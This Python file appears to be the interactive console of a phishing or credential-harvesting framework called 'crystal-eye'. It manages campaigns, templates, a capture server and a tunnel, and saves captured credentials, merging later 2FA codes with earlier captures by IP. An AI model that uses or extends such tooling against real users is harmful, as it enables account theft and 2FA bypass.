from __future__ import annotations

from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console

from crystal_eye.config import CrystalEyeConfig
from crystal_eye.db.engine import Database
from crystal_eye.db.models import Credential
from crystal_eye.db.repository import CampaignRepository, CredentialRepository
from crystal_eye.display.panels import display_credential_panel
from crystal_eye.repl.commands import CommandRegistry
from crystal_eye.repl.completer import CrystalEyeCompleter
from crystal_eye.server.runner import ServerRunner
from crystal_eye.templates.registry import TemplateRegistry
from crystal_eye.tunnel.base import TunnelProvider


class CrystalEyeShell:
    """Main REPL shell using prompt_toolkit."""

    def __init__(
        self,
        config: CrystalEyeConfig,
        template_registry: TemplateRegistry,
    ) -> None:
        self.config = config
        self.template_registry = template_registry
        self.console = Console()
        self.server_runner: ServerRunner | None = None
        self.tunnel: TunnelProvider | None = None

        # DB and repos are initialized when a campaign is set
        self.db: Database | None = None
        self.campaign_repo: CampaignRepository | None = None
        self.cred_repo: CredentialRepository | None = None

        # If config already has a campaign from a previous session, init DB
        if config.campaign:
            self.init_campaign_db()

        self.commands = CommandRegistry(self)
        self.session = PromptSession(
            completer=CrystalEyeCompleter(self),
        )

    def init_campaign_db(self) -> None:
        """Initialize (or re-initialize) the database for the current campaign."""
        if self.db:
            self.db.close()

        db_path = self.config.db_path
        if not db_path:
            return

        self.db = Database(db_path)
        self.db.connect()
        self.campaign_repo = CampaignRepository(self.db)
        self.cred_repo = CredentialRepository(self.db)

    def get_prompt(self) -> HTML:
        if self.config.campaign:
            return HTML(
                "<ansibrightcyan>crystal-eye</ansibrightcyan>"
                " (<ansiyellow>{}</ansiyellow>) > ".format(self.config.campaign)
            )
        return HTML("<ansibrightcyan>crystal-eye</ansibrightcyan> > ")

    def run(self) -> None:
        """Blocking REPL loop. Runs on the main thread."""
        with patch_stdout(raw=True):
            while True:
                try:
                    text = self.session.prompt(self.get_prompt())
                    self.commands.dispatch(text.strip())
                except KeyboardInterrupt:
                    continue
                except EOFError:
                    self.commands.do_exit()
                    break

    def on_credential_captured(self, credential: Credential) -> None:
        """Callback invoked from server thread when credentials arrive."""
        if self.cred_repo:
            is_2fa = "2fa_code" in credential.fields and len(credential.fields) == 1
            if is_2fa:
                merged = self.cred_repo.merge_by_ip(credential)
                credential = merged if merged else self.cred_repo.save(credential)
            else:
                credential = self.cred_repo.save(credential)
        display_credential_panel(self.console, credential)
